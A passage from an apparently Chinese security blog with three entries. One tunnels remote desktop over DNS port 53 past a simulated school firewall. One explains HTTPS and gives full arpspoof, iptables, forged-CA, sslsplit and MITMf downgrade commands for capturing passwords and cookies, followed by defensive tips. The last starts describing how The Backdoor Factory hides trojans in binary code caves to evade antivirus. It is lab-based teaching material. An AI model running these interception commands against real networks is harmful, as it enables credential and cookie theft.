192.168.1.109"></a>&emsp;&emsp;3. win xp &emsp; IP = 192.168.1.109</h4><h4 id="emsp-emsp-4-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-112"><a href="#emsp-emsp-4-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-112" class="headerlink" title="&emsp;&emsp;4. monowall &emsp; LAN IP = 1.1.1.1 &emsp; WAN IP = 192.168.1.112"></a>&emsp;&emsp;4. monowall &emsp; LAN IP = 1.1.1.1 &emsp; WAN IP = 192.168.1.112</h4><blockquote>
<p>[*]这里有monowall的简单<a href="http://www.heminjie.com/network/567.html" target="_blank" rel="external">配置方法</a></p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/RINET%E7%9A%84%E5%A6%99%E7%94%A8/20171227181026_6raRvt_6724.jpeg" alt=""></p>
<h3 id="配置路由表"><a href="#配置路由表" class="headerlink" title="配置路由表:"></a><strong>配置路由表:</strong></h3><h4 id="emsp-emsp-在xp中访问1-1-1-1进入防火墙配置页面，账号admin-密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）"><a href="#emsp-emsp-在xp中访问1-1-1-1进入防火墙配置页面，账号admin-密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）" class="headerlink" title="&emsp;&emsp;在xp中访问1.1.1.1进入防火墙配置页面，账号admin 密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）"></a>&emsp;&emsp;在xp中访问1.1.1.1进入防火墙配置页面，账号admin 密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/RINET%E7%9A%84%E5%A6%99%E7%94%A8/20171227181041_6P6SB8_6728.jpeg" alt=""></p>
<h2 id="0x02-实验步骤"><a href="#0x02-实验步骤" class="headerlink" title="0x02. 实验步骤"></a>0x02. 实验步骤</h2><h4 id="emsp-emsp-上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192-168-1-109的xp。"><a href="#emsp-emsp-上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192-168-1-109的xp。" class="headerlink" title="&emsp;&emsp;上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192.168.1.109的xp。"></a>&emsp;&emsp;上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192.168.1.109的xp。</h4><h4 id="1-首先，在kali中下载安装-rinetd-用于转发流量"><a href="#1-首先，在kali中下载安装-rinetd-用于转发流量" class="headerlink" title="1. 首先，在kali中下载安装 rinetd 用于转发流量"></a>1. 首先，在kali中下载安装 rinetd 用于转发流量</h4><blockquote>
<p>apt-get install rinetd </p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/RINET%E7%9A%84%E5%A6%99%E7%94%A8/20171227181054_YeYibU_6744.jpeg" alt=""></p>
<h4 id="2-然后，修改-rinetd-的配置文件，指定转发规则"><a href="#2-然后，修改-rinetd-的配置文件，指定转发规则" class="headerlink" title="2. 然后，修改 rinetd 的配置文件，指定转发规则"></a>2. 然后，修改 rinetd 的配置文件，指定转发规则</h4><blockquote>
<p>vim /etc/rinetd.conf</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/RINET%E7%9A%84%E5%A6%99%E7%94%A8/20171227181106_543GvN_6763.jpeg" alt=""></p>
<h4 id="3-启动rinetd"><a href="#3-启动rinetd" class="headerlink" title="3. 启动rinetd"></a>3. 启动rinetd</h4><blockquote>
<p>rinetd</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/RINET%E7%9A%84%E5%A6%99%E7%94%A8/20171227181117_VhwPW6_6758.jpeg" alt=""></p>
<h4 id="4-启动远程桌面连接xp"><a href="#4-启动远程桌面连接xp" class="headerlink" title="4. 启动远程桌面连接xp"></a>4. 启动远程桌面连接xp</h4><blockquote>
<p>mstsc</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/RINET%E7%9A%84%E5%A6%99%E7%94%A8/20171227181129_87n6je_6771.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/RINET%E7%9A%84%E5%A6%99%E7%94%A8/20171227181142_MFoUyV_6773.jpeg" alt=""></p>
<h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境-o"><a href="#emsp-emsp-现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境-o" class="headerlink" title="&emsp;&emsp;现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境\^o^"></a>&emsp;&emsp;现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境\^o^</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[HTTPS攻击]]></title>
      <url>/2017/10/27/HTTPS%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<h2 id="0x00-HTTPS简介"><a href="#0x00-HTTPS简介" class="headerlink" title="0x00. HTTPS简介"></a>0x00. HTTPS简介</h2><h4 id="emsp-emsp-超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL-TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。"><a href="#emsp-emsp-超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL-TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。" class="headerlink" title="&emsp;&emsp;超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。"></a>&emsp;&emsp;超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。</h4><a id="more"></a>
<hr>
<h2 id="0x01-HTTPS原理"><a href="#0x01-HTTPS原理" class="headerlink" title="0x01. HTTPS原理"></a>0x01. HTTPS原理</h2><p><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/WEBRESOURCE3d6869925e8ee4875d1f1e227fd804bb/4307" alt="image"></p>
<h4 id="1-首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求"><a href="#1-首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求" class="headerlink" title="1. 首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求"></a>1. 首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求</h4><h4 id="2-连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信"><a href="#2-连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信" class="headerlink" title="2. 连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信"></a>2. 连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信</h4><h4 id="3-然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）"><a href="#3-然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）" class="headerlink" title="3. 然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）"></a>3. 然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）</h4><h4 id="4-client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书"><a href="#4-client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书" class="headerlink" title="4. client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书"></a>4. client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书</h4><h4 id="【-】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。"><a href="#【-】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。" class="headerlink" title="【*】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。"></a>【*】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。</h4><h4 id="5-验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server"><a href="#5-验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server" class="headerlink" title="5. 验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server"></a>5. 验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server</h4><h4 id="6-server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了"><a href="#6-server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了" class="headerlink" title="6. server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了"></a>6. server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了</h4><h4 id="7-通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端"><a href="#7-通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端" class="headerlink" title="7. 通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端"></a>7. 通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端</h4><h4 id="【-】hash-private-encrypt-data-public-encrypt-hash-emsp-–-gt-emsp-server"><a href="#【-】hash-private-encrypt-data-public-encrypt-hash-emsp-–-gt-emsp-server" class="headerlink" title="【*】hash(private_encrypt(data)) + public_encrypt(hash)&emsp;–&gt;&emsp;server"></a>【*】hash(private_encrypt(data)) + public_encrypt(hash)&emsp;–&gt;&emsp;server</h4><h4 id="8-server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data"><a href="#8-server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data" class="headerlink" title="8. server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data"></a>8. server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data</h4><h3 id="server发送数据过程类似："><a href="#server发送数据过程类似：" class="headerlink" title="server发送数据过程类似："></a>server发送数据过程类似：</h3><h4 id="【-】hash-private-encrypt-data-private-encrypt-hash-emsp-–-gt-emsp-client"><a href="#【-】hash-private-encrypt-data-private-encrypt-hash-emsp-–-gt-emsp-client" class="headerlink" title="【*】hash(private_encrypt(data)) + private_encrypt(hash)&emsp;–&gt;&emsp;client"></a>【*】hash(private_encrypt(data)) + private_encrypt(hash)&emsp;–&gt;&emsp;client</h4><hr>
<h2 id="0x02-攻击原理"><a href="#0x02-攻击原理" class="headerlink" title="0x02. 攻击原理"></a>0x02. 攻击原理</h2><p><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/WEBRESOURCE78ffc04751b8ecb4bd840b668482b9c8/4502" alt="image"></p>
<h4 id="emsp-emsp-1-首先attacker会对目标进行中间人攻击，从而让流量流经自己的电脑（这与burpsuit的原理根本就是一样的）"><a href="#emsp-emsp-1-首先attacker会对目标进行中间人攻击，从而让流量流经自己的电脑（这与burpsuit的原理根本就是一样的）" class="headerlink" title="&emsp;&emsp;1. 首先attacker会对目标进行中间人攻击，从而让流量流经自己的电脑（这与burpsuit的原理根本就是一样的）"></a>&emsp;&emsp;1. 首先attacker会对目标进行中间人攻击，从而让流量流经自己的电脑（这与burpsuit的原理根本就是一样的）</h4><h4 id="emsp-emsp-2-此时client便会与attacker进行https加密通信，server也会与attacker进行https加密通信"><a href="#emsp-emsp-2-此时client便会与attacker进行https加密通信，server也会与attacker进行https加密通信" class="headerlink" title="&emsp;&emsp;2. 此时client便会与attacker进行https加密通信，server也会与attacker进行https加密通信"></a>&emsp;&emsp;2. 此时client便会与attacker进行https加密通信，server也会与attacker进行https加密通信</h4><h4 id="emsp-emsp-3-虽然此时进行的是https通信，但是所有的data对于attacker来说都是明文的"><a href="#emsp-emsp-3-虽然此时进行的是https通信，但是所有的data对于attacker来说都是明文的" class="headerlink" title="&emsp;&emsp;3. 虽然此时进行的是https通信，但是所有的data对于attacker来说都是明文的"></a>&emsp;&emsp;3. 虽然此时进行的是https通信，但是所有的data对于attacker来说都是明文的</h4><hr>
<h2 id="0x03-攻击实战"><a href="#0x03-攻击实战" class="headerlink" title="0x03. 攻击实战"></a>0x03. 攻击实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-sslsplit、arpspoof"><a href="#emsp-emsp-1-sslsplit、arpspoof" class="headerlink" title="&emsp;&emsp;1. sslsplit、arpspoof"></a>&emsp;&emsp;1. sslsplit、arpspoof</h4><h4 id="emsp-emsp-2-win-7"><a href="#emsp-emsp-2-win-7" class="headerlink" title="&emsp;&emsp;2. win 7"></a>&emsp;&emsp;2. win 7</h4><h3 id="实战步骤"><a href="#实战步骤" class="headerlink" title="实战步骤"></a>实战步骤</h3><h3 id="1-打开kali的数据包转发功能"><a href="#1-打开kali的数据包转发功能" class="headerlink" title="1. 打开kali的数据包转发功能"></a>1. 打开kali的数据包转发功能</h3><blockquote>
<p>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</p>
<h3 id="2-设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）"><a href="#2-设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）" class="headerlink" title="2. 设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）"></a>2. 设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -F</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">80</span> -j REDIRECT --to-ports <span class="number">8080</span></div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">443</span> -j REDIRECT --to-ports <span class="number">8443</span></div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">587</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">465</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">993</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">995</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -L</div></pre></td></tr></table></figure>
</blockquote>
<h3 id="3-利用openssl生成私钥"><a href="#3-利用openssl生成私钥" class="headerlink" title="3. 利用openssl生成私钥"></a>3. 利用openssl生成私钥</h3><blockquote>
<p>openssl genrsa -out ca.key 2048</p>
</blockquote>
<h3 id="4-利用私钥签名生成的证书"><a href="#4-利用私钥签名生成的证书" class="headerlink" title="4. 利用私钥签名生成的证书"></a>4. 利用私钥签名生成的证书</h3><blockquote>
<p>openssl req -new -x509 -days 1096 -key ca.key -out ca.crt<br><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/6EB70B114869460E88237A53C65D8E10/4435" alt="image"></p>
</blockquote>
<h3 id="5-启动arpspoof进行中间人攻击"><a href="#5-启动arpspoof进行中间人攻击" class="headerlink" title="5. 启动arpspoof进行中间人攻击"></a>5. 启动arpspoof进行中间人攻击</h3><blockquote>
<p>arpspoof -i eth0 -t 192.168.1.103 -r 192.168.1.1</p>
</blockquote>
<h3 id="6-创建log目录，启动sslsplit"><a href="#6-创建log目录，启动sslsplit" class="headerlink" title="6. 创建log目录，启动sslsplit"></a>6. 创建log目录，启动sslsplit</h3><blockquote>
<p>mkdir -p test/logdir </p>
<p>sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/7AD511B11C824B98B4B9555AEDE1443C/4449" alt="image"></p>
<h4 id="如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误"><a href="#如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误" class="headerlink" title="[*]如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误"></a>[*]如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误</h4><h3 id="7-剩下的就是用正则匹配出想要的账号密码或者cookie了"><a href="#7-剩下的就是用正则匹配出想要的账号密码或者cookie了" class="headerlink" title="7. 剩下的就是用正则匹配出想要的账号密码或者cookie了"></a>7. 剩下的就是用正则匹配出想要的账号密码或者cookie了</h3><h3 id="8-当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文"><a href="#8-当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文" class="headerlink" title="8. 当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文"></a>8. 当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文</h3><blockquote>
<p>iptables -t nat -F</p>
<p>mitmf <strong>-</strong>-spoof <strong>-</strong>-arp -i eth0 <strong>-</strong>-gateway 192.168.1.1 <strong>-</strong>-target 192.168.1.103 <strong>-</strong>-hsts</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/73A648CB3A9442459A5DCA6CEAFD64E3/4471" alt="image"></p>
<h4 id="方法多种多样，大家还可以尝试其他工具，这里就不一一列举了"><a href="#方法多种多样，大家还可以尝试其他工具，这里就不一一列举了" class="headerlink" title="[*]方法多种多样，大家还可以尝试其他工具，这里就不一一列举了"></a>[*]方法多种多样，大家还可以尝试其他工具，这里就不一一列举了</h4><hr>
<h2 id="0x04-防御建议"><a href="#0x04-防御建议" class="headerlink" title="0x04. 防御建议"></a>0x04. 防御建议</h2><h3 id="服务端防御"><a href="#服务端防御" class="headerlink" title="服务端防御"></a>服务端防御</h3><h4 id="emsp-emsp-配置最安全的https"><a href="#emsp-emsp-配置最安全的https" class="headerlink" title="&emsp;&emsp;配置最安全的https"></a>&emsp;&emsp;配置最安全的https</h4><h4 id="emsp-emsp-密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文"><a href="#emsp-emsp-密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文" class="headerlink" title="&emsp;&emsp;密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文"></a>&emsp;&emsp;密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文</h4><h3 id="客户端防御"><a href="#客户端防御" class="headerlink" title="客户端防御"></a>客户端防御</h3><h4 id="emsp-emsp-配置路由规则，绑定IP／MAC以防被ARP欺骗"><a href="#emsp-emsp-配置路由规则，绑定IP／MAC以防被ARP欺骗" class="headerlink" title="&emsp;&emsp;配置路由规则，绑定IP／MAC以防被ARP欺骗"></a>&emsp;&emsp;配置路由规则，绑定IP／MAC以防被ARP欺骗</h4><h4 id="emsp-emsp-谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开"><a href="#emsp-emsp-谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开" class="headerlink" title="&emsp;&emsp;谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开"></a>&emsp;&emsp;谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开</h4><h4 id="emsp-emsp-少去蹭网，往往免费的东西才是最贵的"><a href="#emsp-emsp-少去蹭网，往往免费的东西才是最贵的" class="headerlink" title="&emsp;&emsp;少去蹭网，往往免费的东西才是最贵的"></a>&emsp;&emsp;少去蹭网，往往免费的东西才是最贵的</h4><h4 id="emsp-emsp-珍爱生命，远离黑客"><a href="#emsp-emsp-珍爱生命，远离黑客" class="headerlink" title="&emsp;&emsp;珍爱生命，远离黑客"></a>&emsp;&emsp;珍爱生命，远离黑客</h4><hr>
<h3 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h3><h4 id="emsp-emsp-本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。"><a href="#emsp-emsp-本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。" class="headerlink" title="&emsp;&emsp;本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。"></a>&emsp;&emsp;本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[The-Backdoor-Factory]]></title>
      <url>/2017/10/13/The-Backdoor-Factory/</url>
      <content type="html"><![CDATA[<h2 id="0x00-BDF简介"><a href="#0x00-BDF简介" class="headerlink" title="0x00. BDF简介"></a>0x00. BDF简介</h2><h4 id="emsp-emsp-BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！"><a href="#emsp-emsp-BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！" class="headerlink" title="&emsp;&emsp;BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！"></a>&emsp;&emsp;BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！</h4><a id="more"></a>
<hr>
<h2 id="0x01-BDF原理"><a href="#0x01-BDF原理" class="headerlink" title="0x01. BDF原理"></a>0x01. BDF原理</h2><h4 id="emsp-emsp-笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在blackhat上的演讲，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。"><a href="#emsp-emsp-笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在blackhat上的演讲，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。" class="headerlink" title="&emsp;&emsp;笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在blackhat上的演讲，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。"></a>&emsp;&emsp;笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在<a href="https://www.youtube.com/watch?v=OuyLzkG16Uk" target="_blank" rel="external">blackhat上的演讲</a>，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。</h4><p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/9D4C649B65E74C2BBC85888D12100693/3084" alt="image"></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="1-在编译好的二进制文件中-经常会出现很多的00-00（称为代码洞）"><a href="#1-在编译好的二进制文件中-经常会出现很多的00-00（称为代码洞）" class="headerlink" title="1. 在编译好的二进制文件中,经常会出现很多的00 00（称为代码洞）"></a>1. 在编译好的二进制文件中,经常会出现很多的00 00（称为代码洞）</h4><h4 id="2-因为这些00-00是不包含数据信息的，所以如果我们将这些00-00替换成其他数据应该是不影响程序正常执行的"><a href="#2-因为这些00-00是不包含数据信息的，所以如果我们将这些00-00替换成其他数据应该是不影响程序正常执行的" class="headerlink" title="2. 因为这些00 00是不包含数据信息的，所以如果我们将这些00 00替换成其他数据应该是不影响程序正常执行的"></a>2. 因为这些00 00是不包含数据信息的，所以如果我们将这些00 00替换成其他数据应该是不影响程序正常执行的</h4><h4 id="3-现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的"><a href="#3-现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的" class="headerlink" title="3. 现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的"></a>3. 现在将各个代码洞替换成我们生成的木马程序，结果也是可以执行的</h4><h4 id="4-当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果"><a href="#4-当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果" class="headerlink" title="4. 当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果"></a>4. 当程序执行时，再用指针将各个代码洞里面的代码连接成一个完整的木马程序，这样既不会破坏源程序，又能有效的将木马隐藏到二进制文件当中达到免杀效果</h4><hr>
